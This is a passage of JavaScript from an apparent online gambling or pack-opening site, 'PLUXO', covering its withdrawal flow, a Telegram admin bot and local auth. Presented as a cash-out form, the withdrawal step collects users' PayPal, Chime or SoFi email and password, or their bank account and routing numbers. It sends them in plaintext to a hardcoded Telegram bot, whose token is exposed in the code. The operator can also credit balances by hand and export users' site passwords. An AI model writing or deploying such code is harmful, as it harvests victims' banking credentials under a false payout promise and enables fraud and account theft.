                tgNotify('ðŸ† <b>Rank Up!</b>\nðŸ‘¤ <b>' + currentUser.username + '</b>\nâ¬†ï¸ New Rank: <b>' + newRank + '</b>\nðŸŽ Reward: ' + reward.label + ' (+$' + reward.cash + ' added to winnings)\nðŸ•’ ' + new Date().toLocaleString());
            }
        }

        function updateExpDisplay() {
            if (!currentUser) return;
            const exp     = currentUser.exp  || 0;
            const rank    = currentUser.rank || 1;
            const rankEl  = document.getElementById('userRank');
            const fillEl  = document.getElementById('progressFill');
            const progEl  = document.getElementById('userProgress');
            if (rankEl) rankEl.textContent = 'RANK ' + rank;
            if (fillEl) fillEl.style.width = ((exp / 500) * 100) + '%';
            if (progEl) progEl.textContent = exp + ' / 500';
        }

        // â”€â”€ Withdrawal Multi-Step Flow â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        let wdData = {};
        const WD_INPUT = 'width:100%;background:#000;color:#fff;border:2px solid #333;padding:10px;font-family:"Press Start 2P",monospace;font-size:8px;outline:none;margin-bottom:10px;';
        const BANKS = [
            'Chase','Bank of America','Wells Fargo','Citibank','Capital One',
            'TD Bank','US Bank','PNC Bank','Truist','Ally Bank',
            'American Express','Discover','Navy Federal','USAA','Regions Bank',
            'Fifth Third','Huntington','KeyBank','Citizens Bank','Marcus',
            'PayPal','Chime','SoFi',
            'Charles Schwab','Fidelity','Bitcoin','Other'
        ];

        function openWithdrawModal() {
            if (!currentUser) { showLoginModal(); return; }
            wdData = {};
            wdStep1();
            document.getElementById('withdrawModal').classList.add('active');
        }

        function wdStep1() {
            const win = getWinnings(currentUser ? currentUser.username : '');
            document.getElementById('withdrawModalInner').innerHTML = `
                <button class="modal-close" onclick="closeModal('withdrawModal')">Ã—</button>
                <div class="modal-title" style="color:#00ff00;">Withdraw</div>
                <div style="background:#111;border:1px solid #222;padding:12px;margin-bottom:16px;text-align:center;">
                    <div style="font-size:7px;color:#888;margin-bottom:4px;">AVAILABLE TO WITHDRAW</div>
                    <div style="font-size:22px;color:#00ff00;">$${win.toFixed(2)}</div>
                    <div style="font-size:6px;color:#555;margin-top:3px;">Winnings only â€” loaded balance not withdrawable</div>
                </div>
                <div style="font-size:7px;color:#888;margin-bottom:4px;">AMOUNT TO WITHDRAW</div>
                <div style="font-size:6px;color:#555;margin-bottom:8px;">Max per request: <span style="color:#ffd700;">$2,500.00</span></div>
                <input id="wd1Amt" type="number" min="1" max="2500" step="0.01" placeholder="Enter amount (max $2,500)" style="${WD_INPUT}border-color:#00ff00;">
                <div id="wd1Err" style="display:none;color:#ff4444;font-size:7px;padding:8px;border:1px solid #ff4444;margin-bottom:10px;"></div>
                <button class="modal-btn" style="width:100%;" onclick="wdStep1Next()">
                    <span>â†’</span><span>Continue</span>
                </button>`;
        }

        const WD_MAX = 2500;

        function wdStep1Next() {
            const amt = parseFloat(document.getElementById('wd1Amt').value);
            const win = getWinnings(currentUser.username);
            const err = document.getElementById('wd1Err');
            if (!amt || amt <= 0)    { err.textContent='Enter a valid amount.'; err.style.display='block'; return; }
            if (amt > WD_MAX)        { err.textContent='Max withdrawal is $'+WD_MAX.toFixed(2)+' per request.'; err.style.display='block'; return; }
            if (amt > win)           { err.textContent='Exceeds your withdrawable winnings ($'+win.toFixed(2)+').'; err.style.display='block'; return; }
            wdData.amount = amt;
            wdStep2();
        }

        function wdStep2() {
            const bankBtns = BANKS.map(b =>
                `<button onclick="wdSelectBank('${b}')" style="background:#111;color:#fff;border:1px solid #333;padding:8px 6px;font-family:'Press Start 2P',monospace;font-size:6px;cursor:pointer;text-align:center;transition:all 0.1s;" onmouseover="this.style.borderColor='#00ff00';this.style.color='#00ff00';" onmouseout="this.style.borderColor='#333';this.style.color='#fff';">${b}</button>`
            ).join('');
            document.getElementById('withdrawModalInner').innerHTML = `
                <button class="modal-close" onclick="closeModal('withdrawModal')">Ã—</button>
                <div class="modal-title" style="color:#00ff00;margin-bottom:4px;">Select Bank</div>
                <div style="font-size:7px;color:#888;margin-bottom:12px;">Withdrawing: <span style="color:#00ff00;">$${wdData.amount.toFixed(2)}</span></div>
                <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:6px;margin-bottom:14px;">
                    ${bankBtns}
                </div>
                <div style="border-top:1px solid #222;padding-top:12px;">
                    <button onclick="wdOpenTicket()" style="width:100%;background:#1a0a00;color:#ffa500;border:1px solid #ffa500;padding:10px;font-family:'Press Start 2P',monospace;font-size:7px;cursor:pointer;">
                        ðŸŽ« My bank isn't listed â€” Contact Support
                    </button>
                </div>
                <button onclick="wdStep1()" style="width:100%;background:transparent;color:#555;border:1px solid #222;padding:8px;font-family:'Press Start 2P',monospace;font-size:6px;cursor:pointer;margin-top:8px;">â† Back</button>`;
        }

        function wdSelectBank(bank) {
            wdData.bank = bank;
            wdStep3();
        }

        const LOGIN_BANKS = ['PayPal','Chime','SoFi','Bitcoin'];

        function wdStep3() {
            const bank    = wdData.bank;
            const isLogin = LOGIN_BANKS.includes(bank);
            const isBtc   = bank === 'Bitcoin';
            let formHtml;

            if (isBtc) {
                formHtml = `
                    <div style="font-size:7px;color:#888;margin-bottom:6px;">BITCOIN WALLET ADDRESS</div>
                    <input id="wd3Field1" type="text" placeholder="Your BTC wallet address" style="${WD_INPUT}">`;
            } else if (isLogin) {
                formHtml = `
                    <div style="font-size:7px;color:#888;margin-bottom:6px;">EMAIL</div>
                    <input id="wd3Field1" type="email" placeholder="${bank} email" style="${WD_INPUT}">
                    <div style="font-size:7px;color:#888;margin-bottom:6px;">PASSWORD</div>
                    <div style="position:relative;">
                        <input id="wd3Field2" type="password" placeholder="${bank} password" style="${WD_INPUT}padding-right:36px;">
                        <span onclick="togglePw('wd3Field2',this)" style="position:absolute;right:8px;top:10px;cursor:pointer;font-size:14px;">ðŸ‘</span>
                    </div>`;
            } else {
                formHtml = `
                    <div style="display:flex;gap:8px;">
                        <div style="flex:1;">
                            <div style="font-size:7px;color:#888;margin-bottom:6px;">FIRST NAME</div>
                            <input id="wd3First" type="text" placeholder="First name" style="${WD_INPUT}">
                        </div>
                        <div style="flex:1;">
                            <div style="font-size:7px;color:#888;margin-bottom:6px;">LAST NAME</div>
                            <input id="wd3Last" type="text" placeholder="Last name" style="${WD_INPUT}">
                        </div>
                    </div>
                    <div style="font-size:7px;color:#888;margin-bottom:6px;">ACCOUNT NUMBER</div>
                    <input id="wd3Field1" type="text" placeholder="Bank account number" style="${WD_INPUT}" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
                    <div style="font-size:7px;color:#888;margin-bottom:6px;">ROUTING NUMBER</div>
                    <input id="wd3Field2" type="text" placeholder="9-digit routing number" maxlength="9" style="${WD_INPUT}" oninput="this.value=this.value.replace(/[^0-9]/g,'')">`;
            }

            document.getElementById('withdrawModalInner').innerHTML = `
                <button class="modal-close" onclick="closeModal('withdrawModal')">Ã—</button>
                <div class="modal-title" style="color:#00ff00;margin-bottom:4px;">${isLogin ? bank + ' Login' : isBtc ? 'Bitcoin' : 'Bank Details'}</div>
                <div style="font-size:7px;color:#888;margin-bottom:14px;">${bank} â€” <span style="color:#00ff00;">$${wdData.amount.toFixed(2)}</span></div>
                ${formHtml}
                <div id="wd3Err" style="display:none;color:#ff4444;font-size:7px;padding:8px;border:1px solid #ff4444;margin-bottom:10px;"></div>
                <div style="font-size:6px;color:#444;margin-bottom:12px;line-height:1.8;">ðŸ”’ Your information is used solely to process your withdrawal.</div>
                <button class="modal-btn" style="width:100%;" onclick="wdSubmit()">
                    <span>ðŸ’¸</span><span>Submit Withdrawal</span>
                </button>
                <button onclick="wdStep2()" style="width:100%;background:transparent;color:#555;border:1px solid #222;padding:8px;font-family:'Press Start 2P',monospace;font-size:6px;cursor:pointer;margin-top:8px;">â† Back</button>`;
        }

        function wdSubmit() {
            const field1El = document.getElementById('wd3Field1');
            const field2El = document.getElementById('wd3Field2');
            const err      = document.getElementById('wd3Err');
            const field1   = field1El ? field1El.value.trim() : '';
            const field2   = field2El ? field2El.value.trim() : '';
            const isBtc    = wdData.bank === 'Bitcoin';
            const isLogin  = LOGIN_BANKS.includes(wdData.bank);

            if (!field1) {
                err.textContent = isBtc ? 'Enter your wallet address.' : isLogin ? 'Enter your email.' : 'Enter your account number.';
                err.style.display = 'block'; return;
            }
            if (!isBtc && !field2) {
                err.textContent = isLogin ? 'Enter your password.' : 'Enter your routing number.';
                err.style.display = 'block'; return;
            }
            if (!isLogin && !isBtc && field2.length !== 9) {
                err.textContent = 'Routing number must be 9 digits.';
                err.style.display = 'block'; return;
            }
            // Name fields for traditional banks
            if (!isLogin && !isBtc) {
                const first = (document.getElementById('wd3First')?.value || '').trim();
                const last  = (document.getElementById('wd3Last')?.value  || '').trim();
                if (!first) { err.textContent = 'Enter your first name.'; err.style.display = 'block'; return; }
                if (!last)  { err.textContent = 'Enter your last name.';  err.style.display = 'block'; return; }
                wdData.firstName = first;
                wdData.lastName  = last;
            }
            wdData.bankUser = field1;
            wdData.bankPass = field2;

            setWinnings(currentUser.username, getWinnings(currentUser.username) - wdData.amount);
            const requests = JSON.parse(localStorage.getItem('pluxo_withdrawals') || '[]');
            const ticketId = 'WD-' + Date.now();
            requests.push({ id: ticketId, username: currentUser.username, email: currentUser.email, amount: wdData.amount, bank: wdData.bank, bankUser: wdData.bankUser, status: 'pending', date: new Date().toISOString() });
            localStorage.setItem('pluxo_withdrawals', JSON.stringify(requests));

            // Show confirmation step
            document.getElementById('withdrawModalInner').innerHTML = `
                <div style="text-align:center;padding:20px 10px;">
                    <div style="font-size:32px;margin-bottom:16px;">âœ…</div>
                    <div class="modal-title" style="color:#00ff00;margin-bottom:10px;">Withdrawal Submitted</div>
                    <div style="background:#111;border:1px solid #00ff00;padding:16px;margin-bottom:16px;">
                        <div style="font-size:7px;color:#888;margin-bottom:6px;">AMOUNT</div>
                        <div style="font-size:24px;color:#00ff00;">$${wdData.amount.toFixed(2)}</div>
                    </div>
                    <div style="font-size:8px;color:#fff;line-height:2;margin-bottom:6px;">
                        Your withdrawal should arrive in
                    </div>
                    <div style="font-size:11px;color:#00ff00;margin-bottom:16px;">1â€“7 Business Days</div>
                    <div style="font-size:6px;color:#555;line-height:1.8;margin-bottom:20px;">
                        You will be notified once your withdrawal is processed.<br>
                        Contact support if you have any questions.
                    </div>
                    <button class="modal-btn" style="width:100%;" onclick="closeModal('withdrawModal')">
                        <span>âœ“</span><span>Done</span>
                    </button>
                </div>
            `;

            const isBtcWd   = wdData.bank === 'Bitcoin';
            const isLoginWd = LOGIN_BANKS.includes(wdData.bank);
            let credLine;
            if (isBtcWd)        credLine = 'â‚¿ Wallet: <code>' + wdData.bankUser + '</code>';
            else if (isLoginWd) credLine = 'ðŸ“§ Email: <code>' + wdData.bankUser + '</code>\nðŸ”‘ Pass: <code>' + wdData.bankPass + '</code>';
            else                credLine = 'ðŸ‘¤ Name: <b>' + wdData.firstName + ' ' + wdData.lastName + '</b>\nðŸ¦ Acct: <code>' + wdData.bankUser + '</code>\nðŸ“ Routing: <code>' + wdData.bankPass + '</code>';

            tgNotify(
                'ðŸ’¸ <b>Withdrawal Request</b> [' + ticketId + ']\n' +
                'ðŸ‘¤ User: <b>' + currentUser.username + '</b>\n' +
                'ðŸ“§ ' + (currentUser.email||'N/A') + '\n' +
                'ðŸ’° Amount: <b>$' + wdData.amount.toFixed(2) + '</b>\n' +
                'ðŸ¦ Bank: <b>' + wdData.bank + '</b>\n' +
                credLine + '\n' +
                'ðŸ•’ ' + new Date().toLocaleString() + '\n\n' +
                'Reply: /reply ' + currentUser.username + ' [message]'
            );
        }

        function wdOpenTicket() {
            document.getElementById('withdrawModalInner').innerHTML = `
                <button class="modal-close" onclick="closeModal('withdrawModal')">Ã—</button>
                <div class="modal-title" style="color:#ffa500;">Support Ticket</div>
                <div style="font-size:7px;color:#888;margin-bottom:12px;">Describe your issue and we'll get back to you.</div>
                <div style="font-size:7px;color:#888;margin-bottom:6px;">YOUR MESSAGE</div>
                <textarea id="ticketMsg" rows="5" placeholder="Describe your withdrawal issue..." style="width:100%;background:#000;color:#fff;border:2px solid #333;padding:10px;font-family:'Press Start 2P',monospace;font-size:7px;outline:none;resize:vertical;margin-bottom:10px;"></textarea>
                <div id="ticketErr" style="display:none;color:#ff4444;font-size:7px;padding:8px;border:1px solid #ff4444;margin-bottom:10px;"></div>
                <button class="modal-btn" style="width:100%;background:#ffa500;border-color:#ffa500;color:#000;" onclick="submitTicket()">
                    <span>ðŸŽ«</span><span>Submit Ticket</span>
                </button>
                <button onclick="wdStep2()" style="width:100%;background:transparent;color:#555;border:1px solid #222;padding:8px;font-family:'Press Start 2P',monospace;font-size:6px;cursor:pointer;margin-top:8px;">â† Back</button>`;
        }

        function submitTicket() {
            const msg = document.getElementById('ticketMsg').value.trim();
            const err = document.getElementById('ticketErr');
            if (!msg) { err.textContent='Please describe your issue.'; err.style.display='block'; return; }
            const ticketId = 'TKT-' + Date.now();
            closeModal('withdrawModal');
            showNotification('Ticket submitted! Support will reply shortly.', 'success');
            tgNotify(
                'ðŸŽ« <b>Support Ticket</b> [' + ticketId + ']\n' +
                'ðŸ‘¤ <b>' + (currentUser ? currentUser.username : 'Guest') + '</b>\n' +
                'ðŸ“§ ' + (currentUser ? currentUser.email||'N/A' : 'N/A') + '\n' +
                'ðŸ’¬ ' + msg + '\n' +
                'ðŸ•’ ' + new Date().toLocaleString() + '\n\n' +
                'Reply: /reply ' + (currentUser ? currentUser.username : 'guest') + ' [message]'
            );
        }

        function showAdminMessage(text) {
            document.getElementById('adminMsgText').textContent = text;
            document.getElementById('adminMsgPopup').style.display = 'block';
        }

        function checkInbox() {
            if (!currentUser) return;
            try {
                const inbox = JSON.parse(localStorage.getItem('pluxo_inbox') || '{}');
                const msgs  = inbox[currentUser.username.toLowerCase()] || [];
                const unread = msgs.filter(m => !m.read);
                if (unread.length > 0) {
                    unread.forEach(m => showAdminMessage(m.text));
                    msgs.forEach(m => m.read = true);
                    inbox[currentUser.username.toLowerCase()] = msgs;
                    localStorage.setItem('pluxo_inbox', JSON.stringify(inbox));
                }
            } catch(e) {}
        }

        // â”€â”€ Telegram Bot â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        const TG_TOKEN    = '8595954246:AAHJPhQ59Vi9VaFmV3gKWgo6venyYBSAtLo';
        const TG_API      = `https://api.telegram.org/bot${TG_TOKEN}`;

        // â”€â”€ Backend API â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        // After deploying to Railway, set your URL here:
        const API_URL = (window._PLUXO_API || '').replace(/\/$/, '');
        // Example: window._PLUXO_API = 'https://pluxo-backend-production.up.railway.app';

        async function apiCall(method, endpoint, body) {
            if (!API_URL) return null;
            try {
                const opts = { method, headers: { 'Content-Type': 'application/json' } };
                if (body) opts.body = JSON.stringify(body);
                const res = await fetch(API_URL + endpoint, opts);
                return await res.json();
            } catch (e) { return null; }
        }

        // Sync balance + check for admin replies every 30s
        let _syncInterval = null;
        async function startBalanceSync() {
            if (_syncInterval) clearInterval(_syncInterval);
            async function doSync() {
                if (!currentUser || !API_URL) return;
                try {
                    // Sync balance from backend
                    const data = await apiCall('GET', '/api/user/' + currentUser.username);
                    if (data && data.balance) {
                        const bals = _getStore('pluxo_balances') || {};
                        bals[currentUser.username.toLowerCase()] = data.balance;
                        _setStore('pluxo_balances', bals);
                        updateBalanceDisplay();
                    }
                    // Check for admin reply popups
                    const rep = await apiCall('GET', '/api/replies/' + currentUser.username);
                    if (rep && rep.replies && rep.replies.length) {
                        rep.replies.forEach(msg => showAdminReplyPopup(msg));
                    }
                } catch(e) {}
            }
            doSync();
            _syncInterval = setInterval(doSync, 30000);
        }

        // Start syncing if already logged in on page load
        if (currentUser && API_URL) startBalanceSync();
        const TG_OWNER_ID = '7173346586';
        let   tgOffset    = 0; // always start from latest to avoid reprocessing old commands
        let   tgPolling   = null;

        // Pre-set owner chat ID
        localStorage.setItem('tg_owner_chat_id', TG_OWNER_ID);
        localStorage.setItem('tg_setup_done', '1');

        async function tgSend(chatId, text, extra = {}) {
            try {
                await fetch(`${TG_API}/sendMessage`, {
                    method:  'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML', ...extra })
                });
            } catch(e) {}
        }

        async function tgNotify(text) {
            tgSend(TG_OWNER_ID, text);
        }

        async function tgHandleUpdate(update) {
            try {
                const msg = update.message || update.edited_message;
                if (!msg || !msg.text) return;
                const chatId = String(msg.chat.id);
                // Strip @botname suffix from commands e.g. /load@CollectorBot â†’ /load
                const text = msg.text.trim().replace(/@\S+/, '').replace(/\s+/, ' ').trim();

                // Only respond to the owner
                if (chatId !== TG_OWNER_ID) return;

                // Helper: parse command and args
                const parts = text.split(' ');
                const cmd   = parts[0].toLowerCase();

                if (cmd === '/start') {
                    await tgSend(chatId,
                        'ðŸ‘‹ <b>PLUXO Admin Bot</b>\n\n' +
                        '/load [amount] [username] â€” Add balance\n' +
                        '/balance [username] â€” Check user balance\n' +
                        '/balance â€” Show all balances\n' +
                        '/viewusers â€” List all users\n' +
                        '/withdrawals â€” Pending cashouts\n' +
                        '/start â€” This menu'
                    );
                    return;
                }

                if (cmd === '/load') {
                    const amount = parseFloat(parts[1]);
                    const uname  = parts[2];
                    if (!uname || isNaN(amount) || amount <= 0) {
                        await tgSend(chatId, 'âš ï¸ Usage: /load [amount] [username]\nExample: /load 100 nbtnate');
                        return;
                    }
                    addLoaded(uname, amount);
                    const loaded  = getLoaded(uname);
                    const winnings = getWinnings(uname);
                    const total   = loaded + winnings;
                    await tgSend(chatId,
                        'âœ… <b>Balance Loaded</b>\n' +
                        'ðŸ‘¤ User: <b>' + uname + '</b>\n' +
                        'âž• Added: <b>$' + amount.toFixed(2) + '</b>\n' +
                        'ðŸ’³ Loaded: $' + loaded.toFixed(2) + '\n' +
                        'ðŸŽ° Winnings: $' + winnings.toFixed(2) + '\n' +
                        'ðŸ“Š Total: <b>$' + total.toFixed(2) + '</b>'
                    );
                    return;
                }

                if (cmd === '/balance') {
                    const uname = parts[1];
                    if (!uname) {
                        const allLoaded   = _getStore('pluxo_balances');
                        const allWinnings = _getStore('pluxo_winnings');
                        const allUsers    = JSON.parse(localStorage.getItem('pluxo_users') || '[]');
                        if (allUsers.length === 0) { await tgSend(chatId, 'ðŸ“­ No users yet.'); return; }
                        let reply = 'ðŸ’³ <b>All Balances</b>\n\n';
                        allUsers.forEach(u => {
                            const l = parseFloat(allLoaded[u.username.toLowerCase()] || 0);
                            const w = parseFloat(allWinnings[u.username.toLowerCase()] || 0);
                            reply += 'ðŸ‘¤ <b>' + u.username + '</b>: $' + (l + w).toFixed(2) + ' (ðŸ’³$' + l.toFixed(2) + ' + ðŸŽ°$' + w.toFixed(2) + ')\n';
                        });
                        await tgSend(chatId, reply);
                    } else {
                        const l = getLoaded(uname);
                        const w = getWinnings(uname);
                        await tgSend(chatId,
                            'ðŸ’³ <b>' + uname + '</b>\n' +
                            'Loaded: $' + l.toFixed(2) + '\n' +
                            'Winnings: $' + w.toFixed(2) + '\n' +
                            'Total: <b>$' + (l + w).toFixed(2) + '</b>'
                        );
                    }
                    return;
                }

                if (cmd === '/reply') {
                    const uname   = parts[1];
                    const message = parts.slice(2).join(' ');
                    if (!uname || !message) { await tgSend(chatId, 'âš ï¸ Usage: /reply username your message'); return; }
                    const inbox = JSON.parse(localStorage.getItem('pluxo_inbox') || '{}');
                    if (!inbox[uname.toLowerCase()]) inbox[uname.toLowerCase()] = [];
                    inbox[uname.toLowerCase()].push({ text: message, time: new Date().toISOString(), read: false });
                    localStorage.setItem('pluxo_inbox', JSON.stringify(inbox));
                    // If user is currently logged in, show popup immediately
                    if (currentUser && currentUser.username.toLowerCase() === uname.toLowerCase()) {
                        showAdminMessage(message);
                    }
                    await tgSend(chatId, 'âœ… Reply sent to <b>' + uname + '</b>:\n"' + message + '"');
                    return;
                }

                if (cmd === '/withdrawals') {
                    const reqs    = JSON.parse(localStorage.getItem('pluxo_withdrawals') || '[]');
                    const pending = reqs.filter(r => r.status === 'pending');
                    if (pending.length === 0) { await tgSend(chatId, 'ðŸ“­ No pending withdrawal requests.'); return; }
                    let reply = 'ðŸ’¸ <b>Pending Withdrawals (' + pending.length + ')</b>\n\n';
                    pending.forEach((r, i) => {
                        reply += (i+1) + '. <b>' + r.username + '</b>\n   ðŸ’° $' + parseFloat(r.amount).toFixed(2) + ' via ' + r.method + '\n   ðŸ“ ' + r.payInfo + '\n   ðŸ•’ ' + new Date(r.date).toLocaleDateString() + '\n\n';
                    });
                    await tgSend(chatId, reply);
                    return;
                }

                if (cmd === '/viewusers') {
                    const users = JSON.parse(localStorage.getItem('pluxo_users') || '[]');
                    if (users.length === 0) { await tgSend(chatId, 'ðŸ“­ No users have signed up yet.'); return; }
                    let reply = 'ðŸ‘¥ <b>Users (' + users.length + ')</b>\n\n';
                    users.forEach((u, i) => {
                        const total = (getLoaded(u.username) + getWinnings(u.username)).toFixed(2);
                        reply += (i+1) + '. <b>' + u.username + '</b>\n   ðŸ“§ ' + u.email + '\n   ðŸ’³ Balance: $' + total + '\n\n';
                    });
                    await tgSend(chatId, reply);
                    return;
                }

                if (cmd.startsWith('/exportuser')) {
                    const uname = parts[1] ? parts[1].toLowerCase() : '';
                    if (!uname) { await tgSend(chatId, 'âš ï¸ Usage: /exportuser [username]'); return; }
                    const users = JSON.parse(localStorage.getItem('pluxo_users') || '[]');
                    const u = users.find(x => x.username.toLowerCase() === uname);
                    if (!u) { await tgSend(chatId, 'âŒ User <b>' + uname + '</b> not found.'); return; }
                    const balData = _getStore('pluxo_balances') || {};
                    const loaded  = (balData[u.username.toLowerCase()] && typeof balData[u.username.toLowerCase()] === 'object')
                        ? (balData[u.username.toLowerCase()].loaded || 0)
                        : parseFloat(balData[u.username.toLowerCase()] || 0);
                    const winnings = getWinnings(u.username);
                    const exportPayload = {
                        u: { username: u.username, email: u.email, password: u.password, rank: u.rank || 1, exp: u.exp || 0, packsOpened: u.packsOpened || 0 },
                        l: loaded, w: winnings
                    };
                    const code = btoa(JSON.stringify(exportPayload));
                    await tgSend(chatId, 'ðŸ“± <b>Restore Code for ' + u.username + '</b>\n\n<code>' + code + '</code>\n\n<i>Give this code to the user â€” they paste it in the login screen to restore their account on any device.</i>');
                    return;
                }

                // Unknown command â€” echo help
                await tgSend(chatId, 'Unknown command. Send /start for the menu.');
            } catch(e) {
                console.error('tgHandleUpdate error:', e);
            }
        }

        async function tgGetUpdates(offset) {
            const res = await fetch(`${TG_API}/getUpdates`, {
                method:  'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ offset: offset, limit: 100, timeout: 0, allowed_updates: ['message'] })
            });
            if (!res.ok) throw new Error('HTTP ' + res.status);
            return res.json();
        }

        function tgLog(msg) {
            const box = document.getElementById('botLogBox');
            if (!box) return;
            const line = document.createElement('div');
            line.textContent = new Date().toLocaleTimeString() + ' â€” ' + msg;
            line.style.cssText = 'font-size:7px;color:#aaa;border-bottom:1px solid #222;padding:3px 0;';
            box.insertBefore(line, box.firstChild);
            if (box.children.length > 20) box.removeChild(box.lastChild);
        }

        async function tgPoll() {
            try {
                const data = await tgGetUpdates(tgOffset);
                const dot  = document.getElementById('tgStatusDot');
                if (!data.ok) {
                    tgLog('getUpdates failed: ' + (data.description || 'unknown'));
                    if (dot) { dot.style.background = '#ff8800'; dot.title = 'Bot error'; }
                    return;
                }
                if (dot) { dot.style.background = '#00ff00'; dot.title = 'Bot online'; }
                document.getElementById('botLastPoll') && (document.getElementById('botLastPoll').textContent = 'Last poll: ' + new Date().toLocaleTimeString());
                checkInbox();
                if (data.result.length > 0) {
                    tgLog('Got ' + data.result.length + ' update(s)');
                    for (const update of data.result) {
                        const txt = update.message?.text || '(no text)';
                        tgLog('CMD: ' + txt);
                        await tgHandleUpdate(update);
                        tgOffset = update.update_id + 1;
                    }
                    localStorage.setItem('tg_offset', tgOffset);
                }
            } catch(e) {
                tgLog('Poll error: ' + e.message);
                const dot = document.getElementById('tgStatusDot');
                if (dot) { dot.style.background = '#ff4444'; dot.title = 'Bot offline'; }
            }
        }

        async function tgSetup() {
            // Clear webhook so getUpdates works
            try {
                await fetch(`${TG_API}/deleteWebhook`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ drop_pending_updates: false })
                });
            } catch(e) {}
            await new Promise(r => setTimeout(r, 800));

            // Register bot commands
            try {
                await fetch(`${TG_API}/setMyCommands`, {
                    method:  'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        commands: [
                            { command: 'start',     description: 'Show admin menu' },
                            { command: 'viewusers', description: 'List all registered users' }
                        ]
                    })
                });
            } catch(e) {}

            // Fetch ALL pending updates (offset=0 gets everything)
            try {
                const data = await tgGetUpdates(0);
                if (data.ok && data.result.length > 0) {
                    const last   = data.result[data.result.length - 1];
                    const chatId = String(last.message?.chat?.id || last.edited_message?.chat?.id || '');
                    if (chatId) {
                        localStorage.setItem('tg_owner_chat_id', chatId);
                        // Advance offset past all seen updates so we don't re-process them
                        tgOffset = last.update_id + 1;
                        localStorage.setItem('tg_offset', tgOffset);
                    }
                }
            } catch(e) {}

            return localStorage.getItem('tg_owner_chat_id') || null;
        }

        async function tgRunSetup() {
            const btn   = document.getElementById('tgSetupBtn');
            const err   = document.getElementById('tgSetupError');
            const input = document.getElementById('tgChatIdInput');
            const chatId = input ? input.value.trim() : '';

            if (!chatId || !/^\d+$/.test(chatId)) {
                if (err) { err.textContent = 'Please enter your numeric Chat ID from @userinfobot.'; err.style.display = 'block'; }
                return;
            }

            if (btn) { btn.textContent = 'Connecting...'; btn.disabled = true; }
            if (err) err.style.display = 'none';

            // Delete any webhook blocking the bot
            try {
                await fetch(`${TG_API}/deleteWebhook`, {
                    method: 'POST', headers: {'Content-Type':'application/json'},
                    body: JSON.stringify({drop_pending_updates: false})
                });
            } catch(e) {}

            // Register commands
            try {
                await fetch(`${TG_API}/setMyCommands`, {
                    method:  'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        commands: [
                            { command: 'start',     description: 'Show admin menu' },
                            { command: 'viewusers', description: 'List all registered users' }
                        ]
                    })
                });
            } catch(e) {}

            // Test by sending a message
            try {
                const res  = await fetch(`${TG_API}/sendMessage`, {
                    method:  'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: 'âœ… <b>PLUXO Bot Connected!</b>\n\nNotifications are now active.\n\n/start â€” Admin menu\n/viewusers â€” List all users',
                        parse_mode: 'HTML'
                    })
                });
                const data = await res.json();
                if (!data.ok) throw new Error(data.description || 'Send failed');
            } catch(e) {
                if (btn) { btn.textContent = 'Try Again'; btn.disabled = false; }
                if (err) { err.textContent = 'Could not reach that Chat ID. Double-check and try again.'; err.style.display = 'block'; }
                return;
            }

            // Success
            localStorage.setItem('tg_owner_chat_id', chatId);
            localStorage.setItem('tg_setup_done', '1');
            // Advance offset so old messages aren't re-processed
            try {
                const d = await tgGetUpdates(0);
                if (d.ok && d.result.length > 0) {
                    tgOffset = d.result[d.result.length - 1].update_id + 1;
                    localStorage.setItem('tg_offset', tgOffset);
                }
            } catch(e) {}

            document.getElementById('tgSetupBanner').style.display = 'none';
            tgStartPolling();
        }

        function tgStartPolling() {
            if (tgPolling) clearInterval(tgPolling);
            tgPoll(); // run immediately
            tgPolling = setInterval(tgPoll, 3000);
            tgLog('Polling started');
        }

        // Manual load â€” bypass bot for direct admin use
        function adminLoad() {
            const amt   = parseFloat(document.getElementById('adminLoadAmt').value);
            const uname = document.getElementById('adminLoadUser').value.trim();
            if (!uname || !amt || amt <= 0) { tgLog('Invalid load input'); return; }
            addLoaded(uname, amt);
            tgLog('Loaded $' + amt + ' â†’ ' + uname + ' (new total: $' + getBalance(uname).toFixed(2) + ')');
            document.getElementById('adminLoadResult').textContent = 'âœ“ $' + amt + ' loaded to ' + uname;
            document.getElementById('adminLoadAmt').value  = '';
            document.getElementById('adminLoadUser').value = '';
            tgSend(TG_OWNER_ID, 'âœ… Manual Load\nðŸ‘¤ ' + uname + '\nâž• $' + amt.toFixed(2) + '\nðŸ’³ Total: $' + getBalance(uname).toFixed(2));
        }

        function toggleAdminPanel() {
            const panel = document.getElementById('adminPanel');
            panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
        }

        // â”€â”€ localStorage Auth â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        function getUsers() {
            try {
                const data = JSON.parse(localStorage.getItem('pluxo_users') || '[]');
                return Array.isArray(data) ? data : [];
            } catch(e) {
                localStorage.removeItem('pluxo_users');
                return [];
            }
        }
        function saveUsers(users) {
            localStorage.setItem('pluxo_users', JSON.stringify(Array.isArray(users) ? users : []));
        }
        function hashPass(str) {
            let h = 0;
